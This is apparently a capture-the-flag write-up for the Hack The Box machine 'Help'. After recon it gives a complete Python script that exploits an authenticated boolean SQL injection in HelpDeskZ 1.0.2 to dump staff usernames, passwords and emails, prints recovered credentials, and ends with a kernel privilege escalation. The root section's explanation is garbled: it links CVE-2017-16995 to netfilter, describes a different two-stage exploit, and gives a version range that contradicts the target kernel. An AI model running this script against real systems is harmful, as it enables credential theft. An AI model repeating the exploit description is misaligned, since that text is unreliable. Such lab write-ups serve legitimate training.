---
title: Help
date: 2026-07-28
description: Medium Linux box extracting HelpDeskZ staff credentials through a binary-search boolean SQLi, then escalating on a 4.4.0 kernel with the CVE-2017-16995 netfilter exploit.
tags:
  - htb
  - Medium
  - Linux
---

# Initial Recon

```sh
# Nmap 7.98 scan initiated Tue Jul 28 08:26:43 2026 as: /usr/lib/nmap/nmap -p22,80,3000 -A -oN scan_results.txt 10.129.230.159
Nmap scan report for help.htb (10.129.230.159)
Host is up (0.65s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 e5:bb:4d:9c:de:af:6b:bf:ba:8c:22:7a:d8:d7:43:28 (RSA)
|   256 d5:b0:10:50:74:86:a3:9f:c5:53:6f:3b:4a:24:61:19 (ECDSA)
|_  256 e2:1b:88:d3:76:21:d4:1e:38:15:4a:81:11:b7:99:07 (ED25519)
80/tcp   open  http    Apache httpd 2.4.18
|_http-title: Apache2 Ubuntu Default Page: It works
3000/tcp open  http    Node.js Express framework
|_http-title: Site doesn't have a title (application/json; charset=utf-8).
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.19
Network Distance: 2 hops
Service Info: Host: 127.0.1.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 3000/tcp)
HOP RTT       ADDRESS
1   309.27 ms 10.10.16.1
2   549.32 ms help.htb (10.129.230.159)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Tue Jul 28 08:27:57 2026 -- 1 IP address (1 host up) scanned in 73.60 seconds
```

### Graphql endpoint

```sh
400      GET        1l        3w       18c http://help.htb:3000/graphql
```

Introspection is wide open on the GraphQL endpoint:

> https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/GraphQL%20Injection

Enum through the schema until the user table turns up:

`helpme@helpme.com : godhelpmeplz`

### Helpdeskz

```sh
301      GET        9l       28w      306c http://help.htb/support => http://help.htb/support/
```

> https://github.com/ViktorNova/HelpDeskZ/blob/master/UPGRADING.txt

Version shows as 1.0.2 in the footer.

# User

HelpdeskZ 1.0.2 has two known vulnerabilities — we're using the authenticated SQL injection:

> https://www.exploit-db.com/exploits/41200

Instead of slow blind extraction, a binary search over ASCII ranges pulls characters in ~7 requests each — the boolean oracle is the Content-Type header of the attachment endpoint (`image/jpeg` = true, anything else = false). After uploading a **jpg** and grabbing the **base URL attachment param**, the loop looks like this:

```python
import requests
import urllib.parse
import re
import sys

# ============================================================
# CONFIGURATION
# ============================================================

EMAIL = "helpme@helpme.com"
PASSWORD = "godhelpmeplz"

URL = "http://help.htb/support/"
TABLE_NAME = "staff"

REQUEST_TIMEOUT = 10
MAX_STRING_LENGTH = 100

# Printable ASCII range
ASCII_LOW = 32
ASCII_HIGH = 126


# ============================================================
# SESSION
# ============================================================

session = requests.Session()
session.headers.update({
    "User-Agent": "Mozilla/5.0"
})


# ============================================================
# CSRF TOKEN
# ============================================================

def get_token(content):
    """
    Extract the csrfhash value from the HTML response.
    """

    match = re.search(
        r'name=["\']csrfhash["\']\s+value=["\']([^"\']+)["\']',
        content,
        re.IGNORECASE
    )

    if not match:
        return None

    return match.group(1)


# ============================================================
# TICKET ID
# ============================================================

def get_ticket_id(content):
    """
    Extract the first ticket ID from param[]=... .
    """

    match = re.search(
        r'name=["\']param\[\]["\']\s+value=["\']([^"\']+)["\']',
        content,
        re.IGNORECASE
    )

    if match:
        return match.group(1)

    # Fallback for slightly different HTML formatting
    match = re.search(
        r'param\[\]=([^"\']+)',
        content,
        re.IGNORECASE
    )

    if match:
        return match.group(1)

    return None


# ============================================================
# REQUEST / SQL CONDITION TEST
# ============================================================

def test_condition(session, base_url, condition):
    """
    Test whether a SQL condition evaluates as TRUE.

    The target application is used as a boolean oracle:
    Content-Type == image/jpeg  -> TRUE
    Anything else               -> FALSE
    """

    payload = f" AND 1=1 AND ({condition}) -- -"

    encoded_payload = urllib.parse.quote(
        payload,
        safe=""
    )

    target_url = base_url + encoded_payload

    try:
        response = session.get(
            target_url,
            timeout=REQUEST_TIMEOUT
        )

        response.raise_for_status()

    except requests.RequestException as e:
        print(f"[-] Request failed: {e}")
        return False

    return (
        response.headers.get("Content-Type", "").lower()
        == "image/jpeg"
    )


# ============================================================
# BINARY SEARCH - CHARACTER
# ============================================================

def binary_search_char(session, base_url, query, position):
    """
    Recover one character from a SQL query using binary search.

    The character is located using:

        ASCII(SUBSTR(query, position, 1))

    """

    low = ASCII_LOW
    high = ASCII_HIGH

    while low <= high:

        mid = (low + high) // 2

        condition = (
            f"ASCII(SUBSTR(({query}),"
            f"{position},1)) > {mid}"
        )

        if test_condition(session, base_url, condition):
            low = mid + 1
        else:
            high = mid - 1

    # Verify the final candidate
    if ASCII_LOW <= low <= ASCII_HIGH:

        verify_condition = (
            f"ASCII(SUBSTR(({query}),"
            f"{position},1)) = {low}"
        )

        if test_condition(
            session,
            base_url,
            verify_condition
        ):
            return chr(low)

    return None


# ============================================================
# STRING LENGTH
# ============================================================

def get_string_length(
    session,
    base_url,
    query,
    max_length=MAX_STRING_LENGTH
):
    """
    Determine the length of a SQL query result
    using binary search.
    """

    low = 0
    high = max_length

    while low <= high:

        mid = (low + high) // 2

        condition = (
            f"LENGTH(({query})) > {mid}"
        )

        if test_condition(
            session,
            base_url,
            condition
        ):
            low = mid + 1
        else:
            high = mid - 1

    return low


# ============================================================
# STRING EXTRACTION
# ============================================================

def extract_string_binary(
    session,
    base_url,
    query,
    description
):
    """
    Extract an entire string character-by-character.
    """

    print(
        f"[+] Extracting {description}..."
    )

    length = get_string_length(
        session,
        base_url,
        query
    )

    print(
        f"    Length: {length}"
    )

    if length == 0:
        return ""

    result = []

    for position in range(1, length + 1):

        char = binary_search_char(
            session,
            base_url,
            query,
            position
        )

        if char is None:
            print(
                f"\n[-] Failed at position {position}"
            )
            return None

        result.append(char)

        print(
            f"    Position {position}: "
            f"'{char}'"
        )

    final_result = "".join(result)

    print(
        f"[+] Complete: '{final_result}'"
    )

    return final_result


# ============================================================
# USER COUNT
# ============================================================

def get_user_count_binary(
    session,
    base_url,
    table_name
):
    """
    Determine the number of rows in the target table.
    """

    print(
        "[+] Getting user count..."
    )

    # Find an upper bound first
    low = 0
    high = 1

    while test_condition(
        session,
        base_url,
        f"(SELECT COUNT(*) FROM {table_name}) > {high}"
    ):
        high *= 2

        if high > 10000:
            print(
                "[-] User count exceeded "
                "reasonable limit."
            )
            return 0

    # Binary search for the exact count
    while low <= high:

        mid = (low + high) // 2

        condition = (
            f"(SELECT COUNT(*) FROM "
            f"{table_name}) > {mid}"
        )

        if test_condition(
            session,
            base_url,
            condition
        ):
            low = mid + 1
        else:
            high = mid - 1

    # low is the candidate count
    count = low

    # Verify
    verify_condition = (
        f"(SELECT COUNT(*) FROM "
        f"{table_name}) = {count}"
    )

    if test_condition(
        session,
        base_url,
        verify_condition
    ):
        print(
            f"[+] Found {count} users"
        )
        return count

    print(
        "[-] Could not verify user count"
    )

    return 0


# ============================================================
# LOGIN
# ============================================================

def login():
    """
    Obtain the CSRF token and authenticate.
    """

    print(
        "[+] Setting up session..."
    )

    try:
        response = session.get(
            URL,
            timeout=REQUEST_TIMEOUT
        )

        response.raise_for_status()

    except requests.RequestException as e:
        print(
            f"[-] Initial request failed: {e}"
        )
        sys.exit(1)

    token = get_token(response.text)

    if not token:
        print(
            "[-] CSRF token not found"
        )
        sys.exit(1)

    login_data = {
        "do": "login",
        "csrfhash": token,
        "email": EMAIL,
        "password": PASSWORD,
        "btn": "Login"
    }

    try:
        response = session.post(
            URL + "?v=login",
            data=login_data,
            timeout=REQUEST_TIMEOUT
        )

        response.raise_for_status()

    except requests.RequestException as e:
        print(
            f"[-] Login request failed: {e}"
        )
        sys.exit(1)

    ticket_id = get_ticket_id(response.text)

    if not ticket_id:
        print(
            "[-] Ticket ID not found"
        )
        sys.exit(1)

    print(
        f"[+] Found ticket ID: {ticket_id}"
    )

    return ticket_id


# ============================================================
# MAIN
# ============================================================

def main():

    # --------------------------------------------------------
    # Authenticate
    # --------------------------------------------------------

    ticket_id = login()

    # --------------------------------------------------------
    # Build vulnerable endpoint
    # --------------------------------------------------------

    base_url = (
        f"{URL}"
        f"?v=view_tickets"
        f"&action=ticket"
        f"&param[]={ticket_id}"
        f"&param[]=attachment"
        f"&param[]=1"
        f"&param[]=6"
    )

    # --------------------------------------------------------
    # Determine number of users
    # --------------------------------------------------------

    user_count = get_user_count_binary(
        session,
        base_url,
        TABLE_NAME
    )

    if user_count == 0:
        print(
            "[-] No users found."
        )
        sys.exit(1)

    print()
    print("=" * 60)
    print(
        f"EXTRACTING {user_count} USERS"
    )
    print("=" * 60)

    users = []

    # --------------------------------------------------------
    # Extract each record
    # --------------------------------------------------------

    for i in range(user_count):

        print()
        print(
            f"--- USER {i + 1} ---"
        )

        # Username
        username_query = (
            f"SELECT username "
            f"FROM {TABLE_NAME} "
            f"LIMIT {i},1"
        )

        username = extract_string_binary(
            session,
            base_url,
            username_query,
            "username"
        )

        # Password
        password_query = (
            f"SELECT password "
            f"FROM {TABLE_NAME} "
            f"LIMIT {i},1"
        )

        password = extract_string_binary(
            session,
            base_url,
            password_query,
            "password"
        )

        # Email
        email_query = (
            f"SELECT email "
            f"FROM {TABLE_NAME} "
            f"LIMIT {i},1"
        )

        email = extract_string_binary(
            session,
            base_url,
            email_query,
            "email"
        )

        users.append({
            "username": username,
            "password": password,
            "email": email
        })

    # --------------------------------------------------------
    # Results
    # --------------------------------------------------------

    print()
    print("=" * 60)
    print("RESULTS")
    print("=" * 60)

    for i, user in enumerate(users, 1):

        print(
            f"USER {i}: "
            f"{user['username']} | "
            f"{user['email']} | "
            f"{user['password']}"
        )

    print()
    print("CREDENTIALS:")

    for user in users:

        print(
            f"{user['username']}:"
            f"{user['password']}"
        )

    print()
    print(
        f"[+] Extracted {len(users)} users"
    )


# ============================================================
# ENTRY POINT
# ============================================================

if __name__ == "__main__":
    main()
```

> `help - Welcome1`

# Root

```sh
$ uname -r

4.4.0-116-generic
```

> https://www.exploit-db.com/exploits/44298

Exploit 44298 is a Linux kernel local privilege escalation affecting Ubuntu 16.04 and kernel versions < 4.4.0-116. It's identified as CVE-2017-16995 and exploits a flaw in the **netfilter subsystem** within the Linux kernel's **iptables** module.

**Root Cause**: out-of-bounds (OOB) memory access in the netfilter/iptables kernel module

Attack Method: a two-stage exploit (decr.c + pwn.c) — stage 1 manipulates kernel object reference counts through malicious setsockopt calls, and stage 2 exploits the corrupted kernel state to gain arbitrary code execution.

Transfer the exploit to the target, compile it there, and run it:

```sh
$ gcc exp.c -o exp

$ ./exp
```

Gained `root`
